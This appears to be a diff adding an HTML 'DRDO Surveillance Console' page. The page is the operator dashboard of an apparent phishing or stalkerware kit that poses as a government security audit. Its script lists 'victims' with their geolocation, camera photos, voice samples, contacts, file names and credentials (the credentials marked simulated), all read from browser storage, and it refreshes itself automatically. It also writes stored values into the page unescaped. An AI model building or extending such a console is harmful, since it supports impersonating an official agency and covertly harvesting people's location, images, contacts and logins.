@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Surveillance Console · DRDO Clearance</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #0a1014; color: #e9edef; font-family: 'SF Mono', 'Courier New', monospace; padding: 20px; }
+        h1 { color: #00a884; border-bottom: 2px solid #1f2c34; padding-bottom: 15px; margin-bottom: 20px; }
+        .stats-bar { background: #1f2c34; border-radius: 12px; padding: 16px 20px; margin-bottom: 20px; display: flex; gap: 30px; flex-wrap: wrap; align-items: center; }
+        .stat-item { display: flex; flex-direction: column; }
+        .stat-label { color: #8696a0; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; }
+        .stat-value { font-size: 28px; font-weight: 600; color: #00a884; }
+        button { background: #00a884; color: white; border: none; padding: 10px 20px; border-radius: 24px; font-weight: bold; cursor: pointer; margin-right: 10px; transition: 0.2s; }
+        button:hover { background: #008f6e; }
+        button.danger { background: #c0392b; }
+        button.danger:hover { background: #a93226; }
+        .victim-card { background: #1f2c34; border-radius: 16px; padding: 20px; margin-bottom: 24px; border-left: 8px solid #00a884; box-shadow: 0 4px 12px rgba(0,0,0,0.3); }
+        .timestamp { color: #8696a0; font-size: 13px; margin-bottom: 16px; border-bottom: 1px solid #2a373f; padding-bottom: 10px; }
+        .section-title { color: #00a884; font-size: 14px; text-transform: uppercase; letter-spacing: 1px; margin: 20px 0 12px 0; border-bottom: 1px solid #2a373f; padding-bottom: 6px; }
+        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+        .info-row { margin-bottom: 12px; }
+        .info-label { color: #8696a0; font-size: 11px; text-transform: uppercase; }
+        .info-value { font-size: 16px; font-weight: 500; word-break: break-all; margin-top: 2px; }
+        .photo-container { margin: 16px 0; }
+        .photo-thumb { max-width: 220px; border-radius: 12px; border: 2px solid #2a373f; box-shadow: 0 4px 12px rgba(0,0,0,0.5); }
+        .map-link { color: #00a884; text-decoration: none; margin-left: 8px; font-size: 13px; }
+        .map-link:hover { text-decoration: underline; }
+        .badge { background: #2a373f; padding: 4px 10px; border-radius: 20px; font-size: 12px; color: #00a884; display: inline-block; margin-right: 6px; }
+        .empty-state { text-align: center; padding: 60px 20px; color: #8696a0; font-size: 16px; }
+        .json-preview { background: #0b1419; padding: 12px; border-radius: 8px; font-family: monospace; font-size: 12px; overflow-x: auto; white-space: pre-wrap; word-break: break-all; }
+    </style>
+</head>
+<body>
+    <h1>🕵️ DRDO Surveillance Console · Exfiltrated Data</h1>
+    
+    <div class="stats-bar">
+        <div class="stat-item">
+            <span class="stat-label">Total Victims</span>
+            <span class="stat-value" id="victimCount">0</span>
+        </div>
+        <div class="stat-item">
+            <span class="stat-label">Photos Captured</span>
+            <span class="stat-value" id="photoCount">0</span>
+        </div>
+        <div class="stat-item">
+            <span class="stat-label">Voice Samples</span>
+            <span class="stat-value" id="voiceCount">0</span>
+        </div>
+        <div style="margin-left: auto;">
+            <button onclick="loadData()">🔄 Refresh</button>
+            <button class="danger" onclick="clearData()">🗑️ Clear All Data</button>
+        </div>
+    </div>
+
+    <div id="container"></div>
+
+    <script>
+        const STORAGE_KEY = 'waVictims';
+
+        function loadData() {
+            const rawData = localStorage.getItem(STORAGE_KEY);
+            const container = document.getElementById('container');
+            
+            if (!rawData) {
+                container.innerHTML = '<div class="empty-state">📭 No victims yet. Victim must complete the security audit.</div>';
+                document.getElementById('victimCount').textContent = '0';
+                document.getElementById('photoCount').textContent = '0';
+                document.getElementById('voiceCount').textContent = '0';
+                return;
+            }
+
+            try {
+                const victims = JSON.parse(rawData);
+                document.getElementById('victimCount').textContent = victims.length;
+                
+                let photoTotal = 0, voiceTotal = 0;
+                victims.forEach(v => {
+                    if (v.photo && v.photo.startsWith('data:image')) photoTotal++;
+                    if (v.voiceSample && v.voiceSample !== 'Denied') voiceTotal++;
+                });
+                document.getElementById('photoCount').textContent = photoTotal;
+                document.getElementById('voiceCount').textContent = voiceTotal;
+
+                let html = '';
+                // Show latest first
+                victims.slice().reverse().forEach((v, idx) => {
+                    html += `<div class="victim-card">`;
+                    html += `<div class="timestamp">🕒 ${v.timestamp || 'Unknown time'}</div>`;
+                    
+                    // Device & Network
+                    html += `<div class="grid-2">`;
+                    html += `<div><span class="info-label">Device</span><div class="info-value">${v.platform || 'Unknown'}<br>${v.screen || ''}</div></div>`;
+                    html += `<div><span class="info-label">Battery / Network</span><div class="info-value">${v.battery || 'Unknown'}<br>${v.network || 'Unknown'}</div></div>`;
+                    html += `</div>`;
+                    
+                    // Location
+                    html += `<div class="section-title">📍 Geolocation</div>`;
+                    if (v.location && typeof v.location === 'object') {
+                        html += `<div class="info-value">Lat: ${v.location.lat.toFixed(6)}, Lng: ${v.location.lng.toFixed(6)} (Accuracy: ${v.location.accuracy}m)`;
+                        html += ` <a class="map-link" href="https://maps.google.com/?q=${v.location.lat},${v.location.lng}" target="_blank">🗺️ Open in Maps</a></div>`;
+                    } else {
+                        html += `<div class="info-value">${v.location || 'Denied'}</div>`;
+                    }
+
+                    // Photo
+                    html += `<div class="section-title">📸 Facial Recognition Data</div>`;
+                    if (v.photo && v.photo.startsWith('data:image')) {
+                        html += `<div class="photo-container"><img class="photo-thumb" src="${v.photo}" alt="Victim photo"></div>`;
+                    } else {
+                        html += `<div class="info-value">${v.photo || 'Not captured'}</div>`;
+                    }
+
+                    // Voice
+                    html += `<div class="section-title">🎤 Voice Print</div>`;
+                    html += `<div class="info-value">${v.voiceSample || 'Not captured'}</div>`;
+
+                    // Contacts
+                    html += `<div class="section-title">📇 Selected Contacts (${v.contacts ? v.contacts.length : 0})</div>`;
+                    if (v.contacts && v.contacts.length > 0) {
+                        v.contacts.forEach(c => {
+                            html += `<div class="info-value">👤 ${c.name} — ${c.tel}</div>`;
+                        });
+                    } else {
+                        html += `<div class="info-value">None selected</div>`;
+                    }
+
+                    // Files
+                    html += `<div class="section-title">📂 Selected Files (${v.files ? v.files.length : 0})</div>`;
+                    if (v.files && v.files.length > 0) {
+                        v.files.forEach(f => {
+                            html += `<div class="info-value">📄 ${f.name} (${(f.size/1024).toFixed(1)} KB, ${f.type})</div>`;
+                        });
+                    } else {
+                        html += `<div class="info-value">None selected</div>`;
+                    }
+
+                    // Credentials (simulated)
+                    html += `<div class="section-title">🔑 Extracted Credentials (Simulated)</div>`;
+                    if (v.credentials && v.credentials.length > 0) {
+                        v.credentials.forEach(c => {
+                            html += `<div class="info-value"><span class="badge">🔓</span> ${c}</div>`;
+                        });
+                    } else {
+                        html += `<div class="info-value">None</div>`;
+                    }
+
+                    // Raw JSON preview for technical panel
+                    html += `<details style="margin-top:20px;"><summary style="color:#00a884; cursor:pointer;">📋 Raw JSON (Forensics)</summary>`;
+                    html += `<div class="json-preview">${JSON.stringify(v, null, 2)}</div></details>`;
+                    
+                    html += `</div>`; // close card
+                });
+
+                container.innerHTML = html;
+            } catch (e) {
+                container.innerHTML = '<div class="empty-state">⚠️ Error parsing stored data.</div>';
+            }
+        }
+
+        function clearData() {
+            if (confirm('⚠️ Permanently delete ALL captured data? This cannot be undone.')) {
+                localStorage.removeItem(STORAGE_KEY);
+                loadData();
+            }
+        }
+
+        // Initial load and auto-refresh every 10 seconds
+        loadData();
+        setInterval(loadData, 10000);
+    </script>
+</body>
+</html>
